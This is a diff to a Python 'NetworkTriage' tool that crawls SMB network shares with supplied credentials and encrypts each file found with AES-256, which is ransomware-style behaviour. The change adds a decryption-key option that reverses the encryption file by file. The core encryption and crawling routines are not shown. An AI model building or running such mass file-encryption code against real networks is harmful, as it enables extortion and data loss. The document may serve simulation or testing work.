@@ -19,6 +19,7 @@ class NetworkTriage:
         self.encryptionKey = ''
         self.filePaths = []
         self.encrypt_confirmation = False
+        self.decrypt_confirmation = False
 
     logging.getLogger("smbprotocol").setLevel(logging.CRITICAL)
     logging.getLogger("smbclient").setLevel(logging.CRITICAL)
@@ -84,6 +85,10 @@ class NetworkTriage:
         try:
             if args.encrypt:
                 self.encrypt_confirmation = True
+            
+            if args.decryption_key:
+                self.decrypt_confirmation = True
+                self.encryptionKey = args.decryption_key.encode('utf-8')
 
             network_share_thread = threading.Thread(target=self.walk_network_shares, args=(args,))
             network_share_thread.start()
@@ -102,6 +107,9 @@ class NetworkTriage:
                         if self.encrypt_confirmation:
                             print('[+] Encrypting file: %s' % file_path)
                             self.encryptFastAes256(file_path)
+                        elif self.decrypt_confirmation:
+                            print('[+] Decrypting file: %s' % file_path)
+                            self.decryptSingleFile(file_path, self.encryptionKey)
                         else:
                             print("[+] Not Encrypting.")
                             
@@ -178,6 +186,9 @@ class NetworkTriage:
                     args.password,
                     args.domain
                 )
+
+            if args.decryption_key:
+                self.decryption_key = args.decryption_key
 
             if args.encrypt:
                 self.encrypt_confirmation = True
